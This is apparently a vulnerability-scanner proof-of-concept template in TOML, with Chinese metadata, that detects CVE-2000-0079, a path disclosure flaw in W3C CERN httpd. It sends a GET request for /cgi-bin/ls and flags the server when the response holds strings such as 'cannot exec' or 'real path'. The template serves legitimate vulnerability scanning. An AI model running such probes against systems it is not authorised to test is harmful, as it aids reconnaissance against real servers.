[info]
author = "ave"
description = "向W3C CERN httpd服务器发送GET /cgi-bin/ls HTTP/1.0请求，若服务器返回500错误并在响应中泄露cgi-bin目录的真实物理路径，则判定存在路径泄露漏洞"
id = "POC-AVE-2000-0065"
name = "W3C CERN httpd 路径泄露 PoC"
severity = "high"
tags = ["ave-2000-0065"]
vuln_id = [
    "CVE-2000-0079",
    "AVE-2000-0065",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/ls"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Server: CERN",
    "500",
    "cannot exec",
    "real path",
    "no such file",
]
